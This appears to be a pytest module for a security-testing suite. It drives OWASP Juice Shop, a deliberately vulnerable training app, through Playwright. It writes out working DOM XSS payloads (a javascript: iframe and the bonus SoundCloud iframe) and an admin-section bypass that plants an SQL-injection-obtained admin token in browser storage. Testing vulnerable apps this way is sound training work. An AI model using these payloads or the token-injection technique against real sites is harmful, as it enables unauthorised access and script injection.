"""Browser-driven Juice Shop challenges (DOM XSS, bonus XSS, admin section).

These use Playwright because the vulnerability or its detection lives in the Angular
front-end (the search component emits the payload over a WebSocket; the admin route is
guarded client-side). Marked ``juiceshop`` and skipped when Juice Shop is not running.
"""

from __future__ import annotations

import pytest

from secureqa.juiceshop import CHALLENGES
from secureqa.pages.juiceshop_page import JuiceShopPage

pytestmark = [pytest.mark.juiceshop]

# The DOM XSS bonus payload Juice Shop looks for (a SoundCloud auto-play iframe).
_BONUS_PAYLOAD = (
    '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" '
    'src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076'
    '&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true'
    '&show_reposts=false&show_teaser=true"></iframe>'
)


@pytest.mark.owasp_a03
def test_dom_xss_in_search(juice, page, record_finding) -> None:
    """A crafted search term should trigger DOM XSS in the Juice Shop search page."""
    shop = JuiceShopPage(page, juice.base_url)
    shop.open("/#/")
    shop.dismiss_banners()
    payload = '<iframe src="javascript:alert(`xss`)">'
    shop.search(payload)

    solved = juice.wait_until_solved("localXssChallenge", timeout_s=10)
    if solved:
        record_finding(
            CHALLENGES["localXssChallenge"].finding(
                juice.base_url, evidence=f"DOM XSS payload rendered in /#/search: {payload}"
            )
        )
    assert solved, "Juice Shop did not mark the 'DOM XSS' challenge as solved."


@pytest.mark.owasp_a03
def test_dom_xss_bonus_payload(juice, page, record_finding) -> None:
    """The special SoundCloud bonus payload should also trigger DOM XSS."""
    shop = JuiceShopPage(page, juice.base_url)
    shop.open("/#/")
    shop.dismiss_banners()
    shop.search(_BONUS_PAYLOAD)

    solved = juice.wait_until_solved("xssBonusChallenge", timeout_s=10)
    if solved:
        record_finding(
            CHALLENGES["xssBonusChallenge"].finding(
                juice.base_url, evidence="DOM XSS bonus (SoundCloud iframe) payload rendered in /#/search."
            )
        )
    assert solved, "Juice Shop did not mark the 'Bonus Payload' challenge as solved."


@pytest.mark.owasp_a01
def test_admin_section_access(juice, page, record_finding) -> None:
    """Authenticate first, then reach the client-guarded admin section.

    The admin route is only guarded in the Angular front-end: once a valid admin JWT is in
    ``localStorage``, the guard lets us load ``/#/administration``, which then requests the
    tracking pixel that marks the Admin Section challenge. We obtain the admin token with the
    SQL-injection login bypass. (TR: Önce SQLi ile admin token'ı alıp tarayıcıya yerleştiririz.)
    """
    auth = juice.admin_auth()
    assert auth and auth.get("token"), "Could not obtain an admin token via the SQLi login bypass."
    token = auth["token"]

    shop = JuiceShopPage(page, juice.base_url)
    # Visit the origin first so localStorage belongs to the Juice Shop page.
    shop.open("/#/")
    shop.dismiss_banners()
    page.evaluate("(t) => window.localStorage.setItem('token', t)", token)
    page.context.add_cookies([{"name": "token", "value": token, "url": juice.base_url}])

    # Now the client-side admin guard should allow the admin section to load.
    shop.open("/#/administration")
    page.wait_for_timeout(2500)

    solved = juice.wait_until_solved("adminSectionChallenge", timeout_s=10)
    if solved:
        record_finding(
            CHALLENGES["adminSectionChallenge"].finding(
                juice.base_url,
                evidence="Authenticated as admin (SQLi token), then loaded /#/administration.",
            )
        )
    assert solved, "Juice Shop did not mark the 'Admin Section' challenge as solved."
